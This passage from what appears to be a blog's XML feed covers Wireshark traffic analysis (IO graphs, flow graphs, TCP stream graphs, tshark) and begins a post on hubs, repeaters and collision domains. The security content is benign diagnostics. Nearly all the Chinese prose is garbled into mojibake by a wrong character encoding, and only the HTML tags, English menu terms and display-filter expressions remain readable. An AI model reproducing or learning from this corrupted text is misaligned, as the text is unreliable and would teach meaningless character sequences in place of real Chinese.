ç­‰ï¼Œå¦‚æœè¿™ç§ç±»å‹çš„æ•°æ®åŒ…æ¯”è¾ƒå¤šï¼Œè¯´æ˜æˆ‘ä»¬å¯èƒ½åœ¨çœ‹è§†é¢‘ï¼Œæµè§ˆç½‘é¡µæ¯”è¾ƒå¤šï¼Œè¾ƒå°çš„æ•°æ®åŒ…ç”¨ä¼ è¾“æ§åˆ¶ä¿¡æ¯ã€‚</p><h3 id="å›¾è¡¨åˆ†æ">å›¾è¡¨åˆ†æ</h3><h4 id="io-å›¾è¡¨">IO å›¾è¡¨</h4><p>èœå• -&gt; ç»Ÿè®¡ -&gt; IO å›¾è¡¨</p><p>IO å›¾æ˜¯ Wiresharkæœ€é«˜æ•ˆä¹Ÿæœ€å¼ºå¤§çš„å·¥å…·ä¹‹ä¸€ï¼Œå®ƒå¯¹ç½‘ç»œä¸­çš„ååæµé‡è¿›è¡Œå®æ—¶çš„å›¾å½¢æ˜¾ç¤ºï¼Œç”¨æ¥åˆ†æç½‘ç»œæ€§èƒ½</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/iograph.png" /></p><p>ç•Œé¢ï¼š</p><p>ä¸ŠåŠéƒ¨åˆ†æ˜¯å›¾å½¢æ˜¾ç¤ºåŒºåŸŸï¼Œä¸‹è¾¹æ˜¯é…ç½®åŒºåŸŸã€‚</p><p>ä¸‹æ–¹åˆ—è¡¨æ˜¯å¯ä¾›æ˜¾ç¤ºçš„ IO å›¾ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ 8 åˆ—</p><ol type="1"><li>Enabled ï¼šæ˜¾ç¤ºæ­¤å›¾ä¸å¦</li><li>Graph Name ï¼šå›¾è¡¨åï¼ŒåŒå‡»é¼ æ ‡å·¦é”®ï¼Œå¯ä»¥è‡ªå®šä¹‰</li><li>Display Filterï¼šæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œç”¨æ¥è¾“å…¥è¿‡æ»¤è¯­å¥ï¼ŒåŒå‡»é¼ æ ‡å·¦é”®ï¼Œå¯ä»¥è‡ªå®šä¹‰è¯­å¥</li><li>Colorï¼šå›¾çš„é¢œè‰²ï¼ŒåŒå‡»é¼ æ ‡å·¦é”®ï¼Œå¯ä»¥è‡ªå®šä¹‰</li><li>Styleï¼šå›¾è¡¨çš„ç±»å‹ï¼Œæœ‰ barï¼Œdotï¼Œlineç­‰ï¼ŒåŒå‡»é¼ æ ‡å·¦é”®ï¼Œå¯ä»¥è‡ªå®šä¹‰</li><li>Y Axisï¼šY è½´çš„å•ä½ï¼ŒåŒå‡»é¼ æ ‡å·¦é”®ï¼Œå¯ä»¥è‡ªå®šä¹‰ å­—èŠ‚ï¼Œæ¯”ç‰¹MAXï¼ˆï¼‰ï¼šæ¯ä¸ªè®¡æ—¶å•ä½å†…ï¼Œæ‰€ä¼ è¾“æ•°æ®åŒ…ä¸­ç›¸å…³å‚æ•°çš„æœ€é«˜å€¼MINï¼ˆï¼‰ï¼šæ¯ä¸ªè®¡æ—¶å•ä½å†…ï¼Œæ‰€ä¼ è¾“æ•°æ®åŒ…ä¸­ç›¸å…³å‚æ•°çš„æœ€ä½å€¼AVGï¼ˆï¼‰ï¼šæ¯ä¸ªè®¡æ—¶å•ä½å†…ï¼Œæ‰€ä¼ è¾“æ•°æ®åŒ…ä¸­ç›¸å…³å‚æ•°çš„å¹³å‡å€¼SUMï¼ˆï¼‰ï¼šå³è¾¹è¾“å…¥é€‚å½“æ¡ä»¶ï¼ˆå¦‚ï¼šip.lenï¼‰ï¼Œå•ä½æ—¶é—´å†…ï¼Œå‚æ•°æ€»å’Œ COUNTFRAMESï¼ˆï¼‰ï¼šç»Ÿè®¡åœ¨æ¯ä¸ªè®¡æ—¶å•ä½å†…ï¼Œå‘ç”Ÿçš„åŒ¹é…è¯¥æ¡ä»¶çš„ç°è±¡ COUNTFIELDSï¼ˆï¼‰ï¼šæ¯ä¸ªè®¡æ—¶å•ä½å†…ï¼Œæ‰€ä¼ è¾“æ•°æ®åŒ…ä¸­è¯¥å­—æ®µå‡ºç°çš„æ¬¡æ•°</li><li>åé¢ä¸¤ç±»è¿˜æ²¡åŠ¨è¿‡... å·¦ä¸‹è§’åŠ å‡å·å¯ä»¥è‡ªå·±å¢åŠ æˆ–å‡å°‘å›¾ï¼Œé—´éš”æ˜¯ç”¨æ¥æ§åˆ¶x çš„å•ä½çš„ï¼Œä¸€å¤©æ—¶é’Ÿå¤é€‰æ¡†å‹¾é€‰ï¼Œä»¥ä¸€å¤©å½“ä¸­å…·ä½“æ—¶é—´æ¥æ˜¾ç¤º xè½´ï¼Œå¯ä»¥é€‰æ‹©é¼ æ ‡æ‹–æ‹½æˆ–ç¼©æ”¾å›¾è¡¨ã€‚</li></ol><p>ä¸¾ä¾‹ï¼š é€šè¿‡ IO Graphs å›¾å½¢æ¥åæ˜ å¯¹ xx Web é¡µé¢çš„è®¿é—®é‡ï¼šæ˜¾ç¤ºåœ¨ä¸åŒæ—¶é—´å†…ï¼Œè®¿é—® baidu ç«™ç‚¹çš„æ¬¡æ•°ã€‚æ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼ä¸º http.hostcontains "xx"</p><p>æµ‹ç®—ç«¯åˆ°ç«¯ä¹‹é—´çš„ååé‡ï¼ˆä¸»æœº 172.16.89.101 å’Œ 172.16.89.100 é—´çš„ IPæµé‡å›¾ï¼‰ï¼š æ˜¾ç¤ºè¿‡æ»¤å™¨è¯­å¥ ip.addr eq 172.16.89.101 and ip.addr eq172.16.89.100</p><p>æ·»åŠ æ›´å¤šçš„æ¡ä»¶æ¥è§‚å¯Ÿæ•°æ®æµåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å‘ç”Ÿçš„å˜æ•…ï¼š tcp.stream eq 16and tcp.analysis.retransmissionï¼Œåæ˜ æŸè‚¡æ•°æ®æµé‡ä¼ ç°è±¡ tcp.stream eq 16and tcp.analysis.zero_ windowï¼Œåæ˜ æŸè‚¡æ•°æ®æµä¸­çš„ TCP é›¶çª—å£ç°è±¡ï¼ˆtcp.stream eq 8 è¡¨ç¤ºæµç¼–å·ç­‰äº 8 çš„ï¼Œå³ï¼štrace ä¸­ç¬¬ 8 ä¸ª TCP æµï¼‰æ³¨é‡Šï¼š TCP é‡ä¼ ï¼šTCPé‡ä¼ ç°è±¡é¢„ç¤ºç€å‘ç”Ÿäº†ä¸¢åŒ…ï¼Œè¯´æ˜ç½‘ç»œå¡æˆ–è€…å…¶ä»–ä¸ç½‘ç»œæ€§èƒ½æœ‰å…³çš„é—®é¢˜ã€‚ TCPé›¶çª—å£ï¼šTCP é›¶çª—å£ç°è±¡æ„å‘³ç€ TCP æ¥æ”¶æ–¹æˆ–è€…å‘é€æ–¹åæ˜ è¿Ÿé’ã€‚</p><p>è·æ‚‰æŸè‚¡ TCP æ•°æ®æµä¸­æ•°æ®åŒ…çš„æŠ–åŠ¨æƒ…å†µ</p><p>é€‰ä¸­å…¶ä¸­ä¸€ä¸ª TCP åŒ…ï¼Œå³é”®-&gt; å¯¹è¯è¿‡æ»¤å™¨-&gt;TCPï¼Œç„¶åå¤åˆ¶è¯­å¥ï¼Œæ‰“å¼€ IO å›¾è¡¨ï¼Œå†å†™ä¸Š frame.time_delta_displayedå°±å¯ä»¥äº†</p><h4 id="æ•°æ®æµå›¾">æ•°æ®æµå›¾</h4><p>èœå• -&gt; ç»Ÿè®¡ -&gt; æµé‡å›¾</p><p>å°†ä¼šè¯é€šä¿¡è¿‡ç¨‹å›¾å½¢å¯è§†åŒ–å‡ºæ¥ï¼Œå¯ä»¥é€šè¿‡æ˜¾ç¤ºè¿‡æ»¤å™¨è¿‡æ»¤æƒ³è¦æŸ¥çœ‹çš„ï¼Œå†æŸ¥çœ‹ã€‚</p><ol type="1"><li>All packetsï¼šæ‰€æœ‰æ•°æ®åŒ…</li><li>Displayed packetsï¼šç»è¿‡è¿‡æ»¤å™¨è¿‡æ»¤</li><li>æµç±»å‹ï¼šAllflowï¼šæ‰€æœ‰æ•°æ®æˆ–è€…ç»è¿‡è¿‡æ»¤å™¨çš„æ•°æ®åŒ…ç”Ÿæˆæ€»ä½“æ•°æ®æµå›¾ã€tcpflowï¼šæ‰€æœ‰æˆ–è€…è¿›è¿‡è¿‡æ»¤å™¨çš„åŒ…ç”Ÿæˆ TCP æ ‡è®°ã€åºåˆ—å·ã€ACKå·ä»¥åŠæŠ¥æ–‡æ®µé•¿åº¦çš„ TCP æ•°æ®æµå›¾ã€UDP Flow ç­‰</li><li>å·¦ä¸‹è§’ é™åˆ¶æ˜¾ç¤ºè¿‡æ»¤å™¨ å¤é€‰æ¡†ï¼ˆæš‚æ—¶è¿˜ä¸çŸ¥é“å’‹ç”¨ï¼‰ã€‚</li></ol><h2 id="http">HTTP</h2><ol type="1"><li><p>åˆ†ç»„è®¡æ•°å™¨ Packet Counterï¼šäº†è§£æŠ“åŒ…æ–‡ä»¶ä¸­ HTTPæ•°æ®åŒ…çš„æ€»æ•°ä»¥åŠå…¶ä¸­ HTTP å„ç±»å‹è¯·æ±‚æ•°æ®åŒ…ï¼ˆpostã€get ç­‰ï¼‰å’Œ HTTPå“åº”æ•°æ®åŒ…ï¼ˆä» 1xx å¼€å§‹çš„å“åº”çŠ¶æ€ç ï¼‰æ•°é‡åŠæ¯”ç‡åˆ†åˆ«ä¸ºå¤šå°‘ã€‚</p></li><li><p>è¯·æ±‚åºåˆ— Request Sequencesï¼šä¸»æœºè¯·æ±‚è®¿é—®çš„ Webç«™ç‚¹çš„åˆ†å¸ƒæƒ…å†µï¼Œä»¥åŠæ‰€è®¿é—®çš„ Web ç«™ç‚¹ä¸Šçš„å…·ä½“èµ„æºï¼ŒæŒ‡å‘èµ„æºçš„URL</p></li><li><p>è´Ÿè½½åˆ†é… Load Distributionï¼šäº†è§£è®¿é—®è¿‡å“ªäº› Web ç«™ç‚¹ã€‚</p><p>æ³¨ï¼šå¯ä¸‹è½½ä¸“ä¸šæ’é™¤ HTTP æ•…éšœçš„è½¯ä»¶ Fiddler</p></li></ol><h2 id="tcp-æµå›¾å½¢tcp-graph">TCP æµå›¾å½¢ï¼ˆTCP Graphï¼‰</h2><p>TCP Stream Graph èœå•ä¸­ Time-Sequenceï¼ˆStevensï¼‰å­èœå•ç”¨æ³•ï¼š</p><ol type="1"><li>è¯¥å·¥å…·ä¸èƒ½åœ¨çº¿å®æ—¶ç”Ÿæˆç»Ÿè®¡ä¿¡æ¯ï¼Œä½¿ç”¨ä¹‹å‰å…ˆåœæ­¢æŠ“åŒ…</li><li>å…·æœ‰æ–¹å‘æ€§ï¼Œéœ€è¦é€‰ä¸­ä¸€ä¸ªéš¶å±äºéœ€è¦åˆ†æçš„ TCPæ•°æ®æµçš„æ•°æ®åŒ…å†ç”Ÿæˆå›¾è¡¨ï¼Œæ¯”å¦‚ï¼Œè¦è®©æ­¤å·¥å…·ç”Ÿæˆä¸ HTTPä¸‹è½½æµé‡æœ‰å…³çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå°±åº”è¯¥é€‰æ‹©ä¸‹è¡Œæµé‡çš„æ•°æ®åŒ…ï¼Œå³æº Pæ˜¯å…¬ç½‘ï¼Œç«¯å£æ˜¯ 80ï¼Œç›®æ ‡ IP æ˜¯ç§ç½‘ï¼Œç«¯å£æ˜¯éšæœºçš„æ•°æ®åŒ…ã€‚</li><li>Stenvens å­èœå•æ‰€ç”Ÿæˆçš„å›¾å½¢å®é™…ä¸Šåæ˜ çš„æ˜¯ï¼Œåœ¨å•ä½æ—¶é—´å†…ï¼Œå—ç›‘æ§çš„TCPæµåœ¨æŸä¸ªæ–¹å‘æ‰€ä¼ è¾“æ•°æ®çš„å­—èŠ‚æ•°ã€‚æ ¹æ®æ­¤å¯ä»¥åˆ¤æ–­æŸåº”ç”¨çš„ä¸‹è½½æˆ–è€…ä¸Šä¼ é€Ÿåº¦ã€‚</li><li>éœ€è¦æ”¾å¤§å›¾è¡¨ä¸­çš„æŸä¸ªåŒºåŸŸï¼Œåªéœ€è¦ç”¨é¼ æ ‡åœˆå®šè¯¥ç‚¹æ‰€åœ¨çš„åŒºåŸŸï¼Œç¼©å°æŒ‰å‡å·</li><li>é¼ æ ‡å·¦é”®å›¾è¡¨ä¸­çš„ç‚¹ï¼Œä¾¿å¯åœ¨ä¸»çª—å£ä¸­çš„æ•°æ®åŒ…åˆ—è¡¨åŒºåŸŸå®šä½åˆ°ä¸å…¶å¯¹åº”çš„æ•°æ®åŒ…</li><li>å¯åœ¨å¼¹å‡ºçš„çª—å£è°ƒæ•´ç›¸å…³çš„æ˜¾ç¤ºå‚æ•°ã€‚</li></ol><p>TCP Stream Graph èœå•ä¸­ Time-Sequenceï¼ˆtcp-traceï¼‰å­èœå•ç”¨æ³•ï¼š</p><ol type="1"><li>tcp-trace å­èœå•åŠŸèƒ½èµ·æºäº UNIX tcp dump å·¥å…·</li><li>å¯æä¾›è¢«ç›‘æ§ TCP è¿æ¥çš„è¯¸å¤šä¿¡æ¯ï¼ŒåŒ…æ‹¬ TCP ç¡®è®¤ã€TCP é‡ä¼ ã€ä»¥åŠ TCPçª—å£å¤§å°ç­‰ã€‚</li><li>ä¹Ÿéœ€è¦å…ˆåœæ­¢æŠ“ï¼Œå†åˆ†ææ•°æ®ï¼Œç”Ÿæˆå›¾è¡¨</li><li>æ­¤èœå•åæ˜ çš„ä¿¡æ¯æ˜ŸåŠå…¶ä¸°å¯Œï¼Œå¯ä¸ºç½‘ç»œæ’éšœè¯Šæ–­æä¾›é‡è¦çº¿ç´¢</li><li>å¯ç›´è§‚åæ˜ å‡ºè¯¸å¤šç°è±¡ï¼Œæ¯”å¦‚ï¼ŒTCP çª—å£çš„å¡«å……é€Ÿåº¦é«˜äºé¢„æœŸçš„å¤§è§„æ¨¡ TCPé‡ä¼ ç­‰ç°è±¡</li></ol><p>ä¸€æ¡æ›²çº¿ï¼šè¡¨ç¤ºå•ä½æ—¶é—´å†…ï¼Œå—ç›‘æ§çš„ TCPï¼Œåœ¨æŸä¸ªæ–¹å‘ä¸Šæ‰€ä¼ æ•°æ®çš„å­—èŠ‚æ•°å¦ä¸€æ¡è¡¨ç¤ºæ›²çº¿ï¼šè¡¨ç¤ºæ•´ä¸ªæ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­ TCP æŠ¥æ–‡æ®µçš„ TCP æ¥å—çª—å£</p><p>ååé‡ï¼šä¸ä½†èƒ½äº†è§£æŸæ¡ TCP è¿æ¥çš„ååé‡ï¼Œè€Œä¸”è¿˜èƒ½åˆ¤æ–­ TCPè¿æ¥æ˜¯å¦ç¨³å®šã€‚</p><p>å¾€è¿”æ—¶é—´ï¼šèƒ½äº†è§£åˆ°æŸæ¡ TCP è¿æ¥ä¸­ç‰¹å®šæ–¹å‘ä¸Šçš„æ‰€æœ‰ TCPæŠ¥æ–‡æ®µçš„å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰ã€‚</p><p>çª—å£å°ºå¯¸ï¼šèƒ½äº†è§£é€šè¿‡ TCP è¿æ¥ä¼ é€æ•°æ®æ—¶ï¼Œå‘é€æ–¹çš„çª—å£å¤§å°ã€‚</p><h2 id="ipv4-statistics">IPv4 Statistics</h2><ol type="1"><li>All Addressï¼šç”Ÿæˆæœ‰å…³ IP åœ°å€çš„ç»Ÿè®¡</li><li>Destinations and Portsï¼šç”Ÿæˆ IPåœ°å€åœ¨å‘åŒ…æ—¶æ‰€ç”¨çš„ä¼ è¾“å±‚åè®®ä»¥åŠç«¯å£å·</li><li>IP protocol Typesï¼šç”ŸæˆæŠ“å–æ•°æ®ä¸­ IP ä¸Šå±‚çš„åè®®ç»Ÿè®¡ã€‚</li><li>Source and Destination Addressesï¼šç”Ÿæˆæºå’Œç›®æ ‡ IPåœ°å€ç»Ÿè®¡ä¿¡æ¯ã€‚</li></ol><h2 id="å‘½ä»¤è¡Œæ¨¡å¼">å‘½ä»¤è¡Œæ¨¡å¼</h2><p>ä½¿ç”¨å‘½ä»¤è¡Œåˆ†æçš„ä¼˜åŠ¿</p><p>åˆ©ç”¨å‘½ä»¤è¡Œå¯¹æ•è·æ–‡ä»¶è¿›è¡Œè°ƒä¼˜åˆ†æ</p><p>æŒæ¡å‘½ä»¤è¡Œå·¥å…·çš„å¸¸ç”¨å‘½ä»¤</p><p>æŒæ¡å‘½ä»¤è¡Œè¡Œå·¥å…·ä¸ç¬¬ä¸‰æ–¹è¾…åŠ©å·¥å…·çš„ä½¿ç”¨æ–¹æ³•</p><p>æ‰¾åˆ° Wireshark çš„å®‰è£…ç›®å½•ï¼Œä¸‹é¢æœ‰ tshark.exe åŠå…¶å¸®åŠ©æ–‡æ¡£tshark.htmlï¼Œå¤æ‚ç½‘ç»œæƒ…å†µï¼Œæ‰‹å·¥æ¯”è¾ƒå›°éš¾ï¼Œå¯ä»¥ä½¿ç”¨ç¼–å†™è„šæœ¬ï¼Œè¿™æ˜¯å°±éœ€è¦ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·äº†ã€‚</p><p>è¦ä½¿ç”¨ tshark ç­‰å·¥å…·ï¼Œéœ€è¦åˆ‡æ¢è‡³å¯¹åº”ç›®å½•æˆ–å°†ç›®å½•åŠ å…¥ç¯å¢ƒå˜é‡</p><p>å‘½ä»¤è¡Œå¯ä»¥åœ¨ linux ä¸­ä½¿ç”¨ grepã€awk ç­‰é«˜æ•ˆå¤„ç†å·¥å…·</p><p>å¦‚æœéœ€è¦å¯¹æ•è·æ–‡ä»¶çš„æ¦‚è¿°ä¿¡æ¯è¿›è¡ŒæŸ¥çœ‹ï¼Œå¯ä»¥ä½¿ç”¨ capinfos.exe</p><p>ä¸€èˆ¬æŠ“åŒ…ä¹‹åï¼Œå…ˆçœ‹çœ‹æ•è·æ–‡ä»¶å±æ€§ï¼ˆsummaryï¼‰ï¼Œå†çœ‹åè®®åˆ†çº§ï¼ŒæŒæ¡ä¸€ä¸‹å½“å‰ç½‘ç»œçš„å¤§ä½“æƒ…å†µï¼Œç„¶åå†å¹²åˆ«çš„ã€‚</p><p>å¤§ä½“å®Œäº†ï¼Œç»†èŠ‚å¤„ï¼Œåœ¨ä»¥åå®æˆ˜çš„æ—¶å€™ï¼Œè§åˆ°å†å®Œå–„ã€‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><ul><li><ahref="https://www.cnblogs.com/li-hao/archive/2011/12/07/2279912.html">IPå¤´ï¼ŒTCP å¤´ï¼ŒUDP å¤´ï¼ŒMAC å¸§å¤´å®šä¹‰</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WiresharkåŠŸèƒ½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œè®¾å¤‡ä¸ä¸¤ç§å†²çªåŸŸ</title>
      <link href="/blog/2019/07/01/network/device_conflicting_domain/"/>
      <url>/blog/2019/07/01/network/device_conflicting_domain/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆçœ‹ä¸€ä¸‹ <ahref="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B">OSI</a>ä¸ƒå±‚å·¥ä½œæ¨¡å‹</p><p><img src="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/OSI.png" width="60%" height="50%" /></p><h2 id="é›†çº¿å™¨">é›†çº¿å™¨</h2><p>é¦–å…ˆï¼Œâ€œè¯†æ—¶åŠ¡è€…ä¸ºä¿Šæ°â€ï¼Œè¦çŸ¥é“é›†çº¿å™¨æ˜¯å½“åˆæŠ€æœ¯ä¸å‘è¾¾çš„æ—¶å€™å¼€å‘å‡ºæ¥çš„ã€‚éšç€äº¤æ¢æœºä»·æ ¼çš„é™ä½ï¼Œé›†çº¿å™¨å¤§éƒ¨åˆ†è¢«æ·˜æ±°ã€‚å› ä¸ºé›†çº¿å™¨ï¼ˆhubï¼‰æ˜¯æŠŠå°†æ‰€æœ‰ä¿¡å·å¹¿æ’­å‡ºå»å®¹æ˜“é€ æˆç½‘ç»œæ‹¥å¡ï¼Œè€Œäº¤æ¢æœºèƒ½å¤Ÿå¤„ç†2 å±‚çš„åŒ…ï¼Œä½¿ç”¨é€šè¿‡è¯†åˆ« MACåœ°å€æ¥è¿›è¡Œæœ‰é€‰æ‹©çš„è½¬å‘ï¼Œæ—¢å®‰å…¨åˆä¸å®¹æ˜“é€ æˆæ‹¥å¡ï¼Œæ‰€ä»¥äº¤æ¢æœºå‡ ä¹å–ä»£äº†é›†çº¿å™¨ã€‚å—¯ï¼Œæ¥ç€è®²ã€‚</p><h3 id="åŸç†">åŸç†</h3><p>é›†çº¿å™¨æ˜¯æŒ‡å°†å¤šæ¡ä»¥å¤ªç½‘åŒç»çº¿æˆ–å…‰çº¤é›†åˆè¿æ¥åœ¨åŒä¸€æ®µç‰©ç†ä»‹è´¨ä¸‹çš„è®¾å¤‡ï¼ˆåªå¯¹ä¿¡å·è¿›è¡Œæ•´å‹ã€æ”¾å¤§åå†é‡å‘ï¼Œä¸è¿›è¡Œç¼–ç ï¼Œå› æ­¤å¤„äºç‰©ç†å±‚ï¼‰ã€‚å…¶å†…éƒ¨æ˜¯æ€»çº¿å‹æ‹“æ‰‘ï¼Œå„èŠ‚ç‚¹ï¼ˆç«¯ç‚¹ï¼‰å…±ç”¨ä¸€æ¡æ€»çº¿è¿›è¡Œé€šä¿¡ï¼ˆå…¶æ•°æ®æµåœ¨åŒä¸€æ—¶é—´å†…å¿…é¡»ç»´æŒå•å‘æ‰èƒ½ä¿è¯æ•°æ®ä¸æ··æ·†ï¼Œè¿™ä¹Ÿå°±å†³å®šäº†å®ƒåªèƒ½å·¥ä½œåœ¨<a href="#half">åŠåŒå·¥æ¨¡å¼</a>ä¸‹ï¼‰ã€‚</p><p>é›†çº¿å™¨æœ¬èº«ä¸èƒ½è¯†åˆ« MAC åœ°å€å’Œ IPåœ°å€ï¼Œå½“é›†çº¿å™¨ä¸‹è¿æ¥çš„ä¸»æœºè®¾å¤‡é—´ä¼ è¾“æ•°æ®æ—¶ï¼Œæ•°æ®åŒ…æ˜¯ä»¥å¹¿æ’­çš„æ–¹å¼è¿›è¡Œä¼ è¾“ï¼Œå³ï¼šé›†çº¿å™¨å°†è¾“å…¥ç«¯å£çš„ä¿¡å·å¹¿æ’­ç»™ä»¥å¤ªç½‘å†…å…¶ä»–æ‰€æœ‰çš„ç«¯å£ï¼Œæ‰€æœ‰å…¶ä»–ç«¯å£éƒ½ä¼šæ¥æ”¶ä¿¡å·å¹¶ä¸”åˆ¤æ–­å…¶ä¸­çš„Mac æŠ¥å¤´ä¸­çš„æ¥æ”¶æ–¹ Mac åœ°å€æ˜¯ä¸æ˜¯ä¸ºè‡ªå·±çš„ Macåœ°å€ï¼Œå¦‚æœä¸æ˜¯å°±æŠ›å¼ƒï¼Œå¦‚æœæ˜¯å°±æ¥æ”¶å›åº”ã€‚</p><h3 id="ç‰¹æ€§">ç‰¹æ€§</h3><h4 id="å…±äº«å¸¦å®½">å…±äº«å¸¦å®½</h4><p>é›†çº¿å™¨æ˜¯ä¸€ç§â€œå…±äº«â€è®¾å¤‡ï¼Œé›†çº¿å™¨æœ¬èº«ä¸èƒ½è¯†åˆ«ç›®çš„åœ°å€ï¼Œå½“åŒä¸€å±€åŸŸç½‘å†…çš„A ä¸»æœºç»™ Bä¸»æœºä¼ è¾“æ•°æ®æ—¶ï¼Œæ•°æ®åŒ…åœ¨ä»¥é›†çº¿å™¨ä¸ºæ¶æ„çš„ç½‘ç»œä¸Šæ˜¯ä»¥å¹¿æ’­æ–¹å¼ä¼ è¾“çš„ï¼Œç”±æ¯ä¸€å°ç»ˆç«¯é€šè¿‡éªŒè¯æ•°æ®åŒ…å¤´çš„åœ°å€ä¿¡æ¯æ¥ç¡®å®šæ˜¯å¦æ¥æ”¶ã€‚</p><h4 id="åŠåŒå·¥æ¨¡å¼"><a name="half">åŠåŒå·¥æ¨¡å¼</a></h4><p>å…¨åŒå·¥æ˜¯æŒ‡ä¸¤å°è®¾å¤‡åœ¨å‘é€å’Œæ¥æ”¶æ•°æ®æ—¶ï¼Œé€šä¿¡åŒæ–¹éƒ½èƒ½åœ¨åŒä¸€æ—¶åˆ»è¿›è¡Œå‘é€æˆ–æ¥æ”¶æ“ä½œï¼Œè¿™æ ·çš„ä¼ é€æ–¹å¼å°±æ˜¯å…¨åŒå·¥ã€‚è€Œå¤„äºåŠåŒå·¥ä¼ é€æ–¹å¼çš„è®¾å¤‡ï¼Œå½“å…¶ä¸­ä¸€å°è®¾å¤‡åœ¨å‘é€æ•°æ®æ—¶ï¼Œå¦ä¸€å°åªèƒ½æ¥æ”¶ï¼Œè€Œä¸èƒ½åŒæ—¶å°†è‡ªå·±çš„æ•°æ®å‘é€å‡ºå»ï¼Œå³ï¼šåªèƒ½å‘é€æˆ–è€…æ¥æ”¶ä¿¡å·ã€‚</p><p>ç”±äºé›†çº¿å™¨é‡‡å–çš„æ˜¯â€œå¹¿æ’­â€ä¼ è¾“ä¿¡æ¯çš„æ–¹å¼ï¼Œå› æ­¤é›†çº¿å™¨ä¼ é€æ•°æ®æ—¶åªèƒ½å·¥ä½œåœ¨åŠåŒå·¥çŠ¶æ€ä¸‹ã€‚</p><h3 id="å†²çªåŸŸ">å†²çªåŸŸ</h3><p>é›†çº¿å™¨åŒä¸€æ—¶é—´åªèƒ½è½¬å‘ä¸€ç§ä¿¡å·ï¼Œæ¢ä¸€ç§è¯´æ³•ï¼Œå°±æ˜¯åŒä¸€æ—¶åˆ»ç”±é›†çº¿å™¨è¿æ¥çš„ç½‘ç»œä¸­åªèƒ½ä¼ è¾“ä¸€ç»„æ•°æ®ï¼Œå¦‚æœå‘ç”Ÿå†²çªåˆ™éœ€è¦é‡ä¼ ã€‚é›†çº¿å™¨ä¸‹è¿æ¥çš„æ‰€æœ‰ç«¯å£å…±äº«æ•´ä¸ªå¸¦å®½ï¼Œå³æ‰€æœ‰ç«¯å£éƒ½æœ‰å¯èƒ½ä¼šå†²çªã€‚å› æ­¤ï¼Œç§°å¯èƒ½å‘ç”Ÿå†²çªçš„ç«¯å£ç»„æˆçš„ç½‘ç»œä¸ºä¸€ä¸ªå†²çªåŸŸã€‚</p><blockquote><p>ç™¾åº¦ç™¾ç§‘ï¼šåœ¨ä»¥å¤ªç½‘ä¸­ï¼Œå¦‚æœæŸä¸ª CSMA/CDç½‘ç»œä¸Šçš„ä¸¤å°è®¡ç®—æœºåœ¨åŒæ—¶é€šä¿¡æ—¶ä¼šå‘ç”Ÿå†²çªï¼Œé‚£ä¹ˆè¿™ä¸ª CSMA/CDç½‘ç»œå°±æ˜¯ä¸€ä¸ªå†²çªåŸŸï¼ˆcollisiondomain)ã€‚å¦‚æœä»¥å¤ªç½‘ä¸­å„ä¸ªç½‘æ®µä»¥é›†çº¿å™¨è¿æ¥ï¼Œå› ä¸ºä¸èƒ½é¿å…å†²çªï¼Œæ‰€ä»¥å®ƒä»¬ä»ç„¶æ˜¯ä¸€ä¸ªå†²çªåŸŸã€‚</p></blockquote><h2 id="ä¸­ç»§å™¨">ä¸­ç»§å™¨</h2><p>æˆ‘ä»¬çŸ¥é“éšç€ç»è¿‡çš„çº¿ç¼†è¶Šæ¥è¶Šé•¿ï¼Œä¿¡å·å°±ä¼šå˜å¾—è¶Šæ¥è¶Šå¼±ï¼Œè€Œä¸­ç»§å™¨çš„ç›®çš„ä¾¿æ˜¯åœ¨æ¯”ç‰¹çº§åˆ«å¯¹ç½‘ç»œä¿¡å·è¿›è¡Œå†ç”Ÿå’Œé‡å®šæ—¶ï¼Œä»è€Œä½¿å¾—å®ƒä»¬èƒ½å¤Ÿåœ¨ç½‘ç»œä¸Šä¼ è¾“æ›´é•¿çš„è·ç¦»ã€‚è€Œé›†çº¿å™¨çš„ç‰¹æ€§ä¸ä¸­ç»§å™¨å¾ˆç›¸ä¼¼ï¼Œå› æ­¤è¢«ç§°ä¸ºå¤šç«¯å£ä¸­ç»§å™¨ã€‚äºŒè€…çš„åŒºåˆ«åœ¨äºè¿æ¥è®¾å¤‡çš„çº¿ç¼†çš„æ•°é‡ã€‚ä¸€ä¸ªä¸­ç»§å™¨é€šå¸¸åªæœ‰ä¸¤ä¸ªç«¯å£ï¼Œè€Œä¸€ä¸ªé›†çº¿å™¨é€šå¸¸æœ‰4 è‡³ 20 ä¸ªæˆ–æ›´å¤šçš„ç«¯å£ã€‚</p><h2 id="äºŒå±‚äº¤æ¢æœº">äºŒå±‚äº¤æ¢æœº</h2><p>äºŒå±‚äº¤æ¢æœºå±æ•°æ®é“¾è·¯å±‚è®¾å¤‡ï¼Œå®ƒåœ¨æ¥æ”¶ç«¯å£æ¥æ”¶åˆ°ä¿¡å·ï¼Œé€šè¿‡å†…éƒ¨å­˜å‚¨çš„Macåœ°å€è¡¨æŸ¥è¯¢æ¥æ”¶æ–¹çš„ç«¯å£å·ï¼ŒæŸ¥åˆ°ä¹‹åè®©äº¤æ¢ç”µè·¯ä¼ 